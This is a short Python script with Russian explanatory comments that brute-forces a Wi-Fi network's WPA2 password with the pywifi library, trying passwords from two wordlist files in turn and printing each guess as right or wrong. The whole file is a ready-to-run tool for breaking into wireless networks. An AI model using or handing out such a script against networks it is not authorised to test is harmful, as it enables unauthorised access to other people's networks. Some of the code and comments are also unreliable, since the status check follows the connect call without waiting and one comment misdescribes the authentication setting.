from random import *
from string import *
from time import sleep
# Функция sleep() в модуле time python используется для приостановки выполнения
# программы на заданное количество секунд. Это означает, что программа приостанавливается
# на заданное время, и по истечении этого времени программа запускается автоматически.
import pywifi
# Библиотека pywifi - это библиотека для работы с Wi-Fi на языке программирования Python. Она позволяет
# сканировать доступные Wi-Fi сети, подключаться к ним, создавать новые профили и многое другое.
from pywifi import const
#Оператор from pywifi import const импортирует константы, используемые в библиотеке pywifi


def wifi_connect(password, wifi_name):
    wifi = pywifi.PyWiFi()  # создаем объект PyWiFi
    ifaces = wifi.interfaces()[0]  # выбираем первый интерфейс Wi-Fi
    # Оператор iface = wifi.interfaces()[0] выбирает первый доступный интерфейс Wi-Fi на устройстве.
    # Обычно на устройстве может быть несколько интерфейсов Wi-Fi, поэтому мы выбираем первый из них.
    # Далее мы будем использовать этот интерфейс для подключения к Wi-Fi сети
    ifaces.disconnect()
    #sleep(1)

    if ifaces.status() == const.IFACE_DISCONNECTED:
        profile = pywifi.Profile()
        profile.ssid = wifi_name
        profile.key = password
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        # Добавление типа шифрования WPA2-PSK к профилю сети
        profile.auth = const.AUTH_ALG_OPEN
        # Установка алгоритма аутентификации в профиле сети на открытый (без пароля)
        profile.cipher = const.CIPHER_TYPE_CCMP
        #  Установка типа шифрования в профиле сети на CCMP (AES)

        ifaces.remove_all_network_profiles()

        temp_profile = ifaces.add_network_profile(profile)
        ifaces.connect(temp_profile)
        # Подключаемся к сети с использованием созданного профиля

        #sleep(3)

        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False


def main():
    wifi_name = input()
    flag = False
    with open('ПАРОЛИ_1000.txt', 'r') as f:
        for i in [i.rstrip() for i in f.readlines()]:
            if wifi_connect(i, wifi_name):
                print(f'Пароль {i} верный!')
                flag = True
                break
            else:
                print(f'Пароль {i} неверный!')
                continue
    if not flag:
        with open('ПАРОЛИ_1000000.txt', 'r') as f:
                for i in [i.rstrip() for i in f.readlines()]:
                    if wifi_connect(i, wifi_name):
                        print(f'Пароль {i} верный!')
                        break
                    else:
                        print(f'Пароль {i} неверный!')
                    continue


main()






